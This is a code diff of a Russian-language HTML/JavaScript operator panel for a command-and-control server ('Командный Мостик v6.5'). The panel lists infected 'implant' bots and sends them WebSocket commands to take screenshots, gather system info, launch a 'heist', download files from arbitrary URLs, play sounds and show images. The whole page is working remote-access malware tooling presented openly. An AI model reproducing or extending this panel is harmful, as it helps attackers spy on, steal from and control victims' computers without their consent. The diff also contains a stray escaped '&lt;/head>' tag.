@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 6.5 - Инстинкт выживания) -->
+<!-- Файл: index.html (Версия 6.5 - Полная сборка) -->
 <html lang="ru">
 
 <head>
@@ -295,253 +295,298 @@
             }
         }
     </style>
-</head>
+    &lt;/head>
 
-<body>
-    <div class="container">
-        <header>
-            <h1>Коммандный Мостик v6.5</h1></header>
-        <main class="app-layout">
-            <!-- ... (HTML остается без изменений) ... -->
-        </main>
-    </div>
+    <body>
+        <div class="container">
+            <header>
+                <h1>Коммандный Мостик v6.5</h1></header>
 
-    <script>
-        // ==============================================================================
-        // JAVASCRIPT-МОЗГ v6.5 (с инстинктом самосохранения)
-        // ==============================================================================
-        const ui = {
-            botList: document.getElementById('bot-list'),
-            controlsWrapper: document.getElementById('controls-wrapper'),
-            selectedBotName: document.getElementById('selected-bot-name'),
-            logList: document.getElementById('log-list'),
-            audioFilesList: document.getElementById('audio-files-list'),
-            imageFilesList: document.getElementById('image-files-list'),
-            volumeSlider: document.getElementById('volume-slider'),
-            muteButton: document.getElementById('mute-btn'),
-            volumeValue: document.getElementById('volume-value'),
-            urlInput: document.getElementById('url-input'),
-            logContainer: document.querySelector('.log-container'),
-            logHeader: document.getElementById('log-header')
-        };
-        let socket, selectedBotId = null,
-            pingInterval = null,
-            watchdogTimer = null;
+            <main class="app-layout">
+                <aside class="sidebar">
+                    <h2>Боты в сети</h2>
+                    <div id="bot-list">
+                        <p style="text-align:center;">Подключение к серверу...</p>
+                    </div>
+                </aside>
+                <div class="main-content">
+                    <div id="controls-wrapper" style="display:none;">
+                        <section>
+                            <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
+                            <div class="grid-controls">
+                                <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
+                                <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+                                <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
+                            </div>
+                        </section>
+                        <section>
+                            <h2>Загрузка новых файлов</h2>
+                            <input type="text" id="url-input" placeholder="URL файла (mp3, wav, jpg, png)...">
+                            <button class="btn-action" onclick="downloadFile()">Загрузить</button>
+                        </section>
+                        <section>
+                            <h2>Пранки и Медиа</h2>
+                            <div class="grid-controls">
+                                <div>
+                                    <h3>Управление звуком</h3>
+                                    <div class="volume-control-wrapper">
+                                        <input type="range" id="volume-slider" min="0" max="100" value="50">
+                                        <span id="volume-value">50%</span>
+                                    </div>
+                                    <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
+                                </div>
+                                <div>
+                                    <h3>Локальные звуки</h3>
+                                    <div id="audio-files-list" class="grid-controls"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <h3 style="grid-column: 1 / -1;">Локальные изображения</h3>
+                                <div id="image-files-list" class="thumbnail-container"></div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </main>
 
-        function log(message, type = 'info') {
-            const now = new Date();
-            const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
-            const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
-            entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
-            ui.logList.appendChild(entry);
-            ui.logList.scrollTop = ui.logList.scrollHeight;
-        }
+            <div class="log-container">
+                <div class="log-header" id="log-header">
+                    <h3>Консоль логов</h3>
+                    <button id="toggle-log-btn">&times;</button>
+                </div>
+                <div id="log-list"></div>
+            </div>
+        </div>
 
-        function connect() {
-            log("Подключение к C2...");
-            // --- ПЕРЕД КАЖДОЙ ПОПЫТКОЙ УБИВАЕМ СТАРЫЕ ТАЙМЕРЫ ---
-            if (pingInterval) clearInterval(pingInterval);
-            if (watchdogTimer) clearTimeout(watchdogTimer);
-
-            socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
-
-            socket.onopen = () => {
-                log("Соединение установлено.", "success");
-                socket.send(JSON.stringify({
-                    type: 'operator'
-                }));
-
-                // --- ЗАПУСКАЕМ СЕРДЦЕБИЕНИЕ И СТОРОЖЕВОГО ПСА ---
-                pingInterval = setInterval(() => {
-                    if (socket.readyState === WebSocket.OPEN) {
-                        socket.send('ping');
-                        // Взводим таймер. Если через 10с не будет ответа, соединение - труп.
-                        watchdogTimer = setTimeout(() => {
-                            log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
-                            socket.close(); // Это вызовет onclose и запустит переподключение
-                        }, 10000);
-                    }
-                }, 25000);
+        <script>
+            const ui = {
+                botList: document.getElementById('bot-list'),
+                controlsWrapper: document.getElementById('controls-wrapper'),
+                selectedBotName: document.getElementById('selected-bot-name'),
+                logList: document.getElementById('log-list'),
+                audioFilesList: document.getElementById('audio-files-list'),
+                imageFilesList: document.getElementById('image-files-list'),
+                volumeSlider: document.getElementById('volume-slider'),
+                muteButton: document.getElementById('mute-btn'),
+                volumeValue: document.getElementById('volume-value'),
+                urlInput: document.getElementById('url-input'),
+                logContainer: document.querySelector('.log-container'),
+                logHeader: document.getElementById('log-header')
             };
+            let socket, selectedBotId = null,
+                pingInterval = null,
+                watchdogTimer = null;
 
-            socket.onmessage = (event) => {
-                // --- ГЛАВНОЕ ИЗМЕНЕНИЕ: ОБРАБОТКА PONG ---
-                if (event.data === 'pong') {
-                    // Сервер жив. Гладим пса по голове (сбрасываем таймер).
-                    if (watchdogTimer) clearTimeout(watchdogTimer);
-                    return;
-                }
+            function log(message, type = 'info') {
+                const now = new Date();
+                const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+                const entry = document.createElement('div');
+                entry.className = `log-entry log-${type}`;
+                entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
+                ui.logList.appendChild(entry);
+                ui.logList.scrollTop = ui.logList.scrollHeight;
+            }
 
-                try {
-                    const msg = JSON.parse(event.data);
-                    switch (msg.type) {
-                        case 'bot_list':
-                            updateBotList(msg.data);
-                            break;
-                        case 'bot_details':
-                            if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
-                            break;
-                        case 'status':
-                            log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
-                            break;
-                        case 'volume_update':
-                            if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
-                            break;
-                        case 'file_list_update':
-                            if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
-                            break;
-                    }
-                } catch (e) {
-                    log(`Ошибка обработки сообщения от сервера: ${e}`, 'error');
-                }
-            };
-
-            socket.onclose = () => {
-                log("Соединение потеряно. Переподключение через 3 секунды...", "error");
+            function connect() {
+                log("Подключение к C2...");
                 if (pingInterval) clearInterval(pingInterval);
                 if (watchdogTimer) clearTimeout(watchdogTimer);
-                selectBot(null);
-                setTimeout(connect, 3000);
-            };
-        }
-
-        // --- Остальной код без изменений, он уже стабилен ---
-        function updateBotList(bots) {
-            log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
-            const savedBotId = localStorage.getItem('lastSelectedBot');
-            const currentSelected = selectedBotId;
-            ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-            bots.forEach(botId => {
-                const btn = document.createElement('button');
-                btn.textContent = botId.replace('implant_', '');
-                btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(botId);
-                ui.botList.appendChild(btn);
-            });
-            if (currentSelected && bots.includes(currentSelected)) {
-                selectBot(currentSelected, false);
-            } else if (savedBotId && bots.includes(savedBotId)) {
-                selectBot(savedBotId, true);
-            } else {
-                selectBot(bots.length > 0 ? bots[0] : null, true);
-            }
-        }
-
-        function selectBot(botId, requestDetails = true) {
-            selectedBotId = botId;
-            if (botId) {
-                localStorage.setItem('lastSelectedBot', botId);
-            } else {
-                localStorage.removeItem('lastSelectedBot');
-            }
-            document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
-                btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
-            });
-            if (botId) {
-                ui.controlsWrapper.style.display = 'block';
-                ui.selectedBotName.textContent = botId.replace('implant_', '');
-                if (requestDetails) {
-                    log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
-                    socket.send(JSON.stringify({
-                        type: 'get_details',
-                        target_id: botId
-                    }));
+                if (socket && socket.readyState !== WebSocket.CLOSED) {
+                    socket.close();
                 }
-            } else {
-                ui.controlsWrapper.style.display = 'none';
+
+                socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+
+                socket.onopen = () => {
+                    log("Соединение установлено.", "success");
+                    socket.send(JSON.stringify({
+                        type: 'operator'
+                    }));
+                    pingInterval = setInterval(() => {
+                        if (socket.readyState === WebSocket.OPEN) {
+                            socket.send('ping');
+                            watchdogTimer = setTimeout(() => {
+                                log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
+                                socket.close();
+                            }, 10000);
+                        }
+                    }, 25000);
+                };
+
+                socket.onmessage = (event) => {
+                    if (event.data === 'pong') {
+                        if (watchdogTimer) clearTimeout(watchdogTimer);
+                        return;
+                    }
+
+                    try {
+                        const msg = JSON.parse(event.data);
+                        switch (msg.type) {
+                            case 'bot_list':
+                                updateBotList(msg.data);
+                                break;
+                            case 'bot_details':
+                                if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
+                                break;
+                            case 'status':
+                                log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
+                                break;
+                            case 'volume_update':
+                                if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
+                                break;
+                            case 'file_list_update':
+                                if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
+                                break;
+                        }
+                    } catch (e) {
+                        log(`Ошибка обработки сообщения от сервера: ${e}`, 'error');
+                    }
+                };
+
+                socket.onclose = () => {
+                    log("Соединение потеряно. Переподключение через 3 секунды...", "error");
+                    if (pingInterval) clearInterval(pingInterval);
+                    if (watchdogTimer) clearTimeout(watchdogTimer);
+                    selectBot(null);
+                    setTimeout(connect, 3000);
+                };
             }
-        }
 
-        function handleBotDetails(data) {
-            log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
-            if (data.files) renderBotFiles(data.files);
-            if (data.volume_state) updateVolumeUI(data.volume_state);
-        }
-
-        function updateVolumeUI(state) {
-            log(`Синхронизация звука: Громкость ${state.level}%, Mute: ${state.is_muted}`, 'success');
-            ui.volumeSlider.value = state.level;
-            ui.volumeValue.textContent = `${state.level}%`;
-            ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
-            ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
-        }
-
-        function renderBotFiles(files) {
-            const audioContainer = ui.audioFilesList;
-            audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
-            if (files.audio) files.audio.forEach(file => {
-                const btn = document.createElement('button');
-                btn.textContent = file;
-                btn.className = 'btn-action';
-                btn.onclick = () => sendCommand({
-                    action: 'play',
-                    filename: file
+            function updateBotList(bots) {
+                log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
+                const savedBotId = localStorage.getItem('lastSelectedBot');
+                const currentSelected = selectedBotId;
+                ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
+                bots.forEach(botId => {
+                    const btn = document.createElement('button');
+                    btn.textContent = botId.replace('implant_', '');
+                    btn.className = 'btn-bot';
+                    btn.onclick = () => selectBot(botId);
+                    ui.botList.appendChild(btn);
                 });
-                audioContainer.appendChild(btn);
-            });
-            const imageContainer = ui.imageFilesList;
-            imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
-            if (files.image) files.image.forEach(imgData => {
-                const item = document.createElement('div');
-                item.className = 'thumbnail-item';
-                item.onclick = () => sendCommand({
-                    action: 'show',
-                    filename: imgData.filename
-                });
-                const imgElement = document.createElement('img');
-                imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview';
-                imgElement.alt = imgData.filename;
-                const nameElement = document.createElement('p');
-                nameElement.textContent = imgData.filename;
-                item.appendChild(imgElement);
-                item.appendChild(nameElement);
-                imageContainer.appendChild(item);
-            });
-        }
+                if (currentSelected && bots.includes(currentSelected)) {
+                    selectBot(currentSelected, false);
+                } else if (savedBotId && bots.includes(savedBotId)) {
+                    selectBot(savedBotId, true);
+                } else {
+                    selectBot(bots.length > 0 ? bots[0] : null, true);
+                }
+            }
 
-        function sendCommand(payload) {
-            if (!selectedBotId) return;
-            if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
-            socket.send(JSON.stringify({
-                type: 'command',
-                target_id: selectedBotId,
-                payload
-            }));
-            log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
-        }
-        const debounce = (func, delay) => {
-            let timeout;
-            return (...args) => {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => func(...args), delay);
+            function selectBot(botId, requestDetails = true) {
+                selectedBotId = botId;
+                if (botId) {
+                    localStorage.setItem('lastSelectedBot', botId);
+                } else {
+                    localStorage.removeItem('lastSelectedBot');
+                }
+                document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
+                    btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
+                });
+                if (botId) {
+                    ui.controlsWrapper.style.display = 'block';
+                    ui.selectedBotName.textContent = botId.replace('implant_', '');
+                    if (requestDetails) {
+                        log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
+                        socket.send(JSON.stringify({
+                            type: 'get_details',
+                            target_id: botId
+                        }));
+                    }
+                } else {
+                    ui.controlsWrapper.style.display = 'none';
+                }
+            }
+
+            function handleBotDetails(data) {
+                log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
+                if (data.files) renderBotFiles(data.files);
+                if (data.volume_state) updateVolumeUI(data.volume_state);
+            }
+
+            function updateVolumeUI(state) {
+                log(`Синхронизация звука: Громкость ${state.level}%, Mute: ${state.is_muted}`, 'success');
+                ui.volumeSlider.value = state.level;
+                ui.volumeValue.textContent = `${state.level}%`;
+                ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+                ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
+            }
+
+            function renderBotFiles(files) {
+                const audioContainer = ui.audioFilesList;
+                audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
+                if (files.audio) files.audio.forEach(file => {
+                    const btn = document.createElement('button');
+                    btn.textContent = file;
+                    btn.className = 'btn-action';
+                    btn.onclick = () => sendCommand({
+                        action: 'play',
+                        filename: file
+                    });
+                    audioContainer.appendChild(btn);
+                });
+                const imageContainer = ui.imageFilesList;
+                imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
+                if (files.image) files.image.forEach(imgData => {
+                    const item = document.createElement('div');
+                    item.className = 'thumbnail-item';
+                    item.onclick = () => sendCommand({
+                        action: 'show',
+                        filename: imgData.filename
+                    });
+                    const imgElement = document.createElement('img');
+                    imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview';
+                    imgElement.alt = imgData.filename;
+                    const nameElement = document.createElement('p');
+                    nameElement.textContent = imgData.filename;
+                    item.appendChild(imgElement);
+                    item.appendChild(nameElement);
+                    imageContainer.appendChild(item);
+                });
+            }
+
+            function sendCommand(payload) {
+                if (!selectedBotId) return;
+                if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
+                socket.send(JSON.stringify({
+                    type: 'command',
+                    target_id: selectedBotId,
+                    payload
+                }));
+                log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
+            }
+            const debounce = (func, delay) => {
+                let timeout;
+                return (...args) => {
+                    clearTimeout(timeout);
+                    timeout = setTimeout(() => func(...args), delay);
+                };
             };
-        };
-        const debouncedSendVolume = debounce(value => sendCommand({
-            action: 'volume',
-            level: value
-        }), 250);
-        ui.volumeSlider.addEventListener('input', (event) => {
-            const newLevel = event.target.value;
-            ui.volumeValue.textContent = `${newLevel}%`;
-            debouncedSendVolume(newLevel);
-        });
+            const debouncedSendVolume = debounce(value => sendCommand({
+                action: 'volume',
+                level: value
+            }), 250);
+            ui.volumeSlider.addEventListener('input', (event) => {
+                const newLevel = event.target.value;
+                ui.volumeValue.textContent = `${newLevel}%`;
+                debouncedSendVolume(newLevel);
+            });
 
-        function downloadFile() {
-            const url = ui.urlInput.value.trim();
-            if (url) {
-                sendCommand({
-                    action: 'download',
-                    url
-                });
+            function downloadFile() {
+                const url = ui.urlInput.value.trim();
+                if (url) {
+                    sendCommand({
+                        action: 'download',
+                        url
+                    });
+                }
             }
-        }
-        ui.logHeader.addEventListener('click', () => {
-            ui.logContainer.classList.toggle('collapsed');
-        });
+            ui.logHeader.addEventListener('click', () => {
+                ui.logContainer.classList.toggle('collapsed');
+            });
 
-        connect();
-    </script>
-</body>
+            connect();
+        </script>
+    </body>
 
 </html>
